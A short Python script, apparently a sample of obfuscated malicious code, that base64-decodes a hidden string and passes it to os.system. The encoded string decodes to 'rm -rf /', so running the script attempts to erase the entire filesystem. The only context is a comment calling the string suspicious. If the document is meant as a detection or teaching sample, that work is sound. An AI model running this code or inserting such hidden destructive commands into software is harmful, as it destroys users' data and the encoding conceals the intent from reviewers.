import base64
import os

payload = "cm0gLXJmIC8=" # suspicious encoded string
os.system(base64.b64decode(payload).decode())
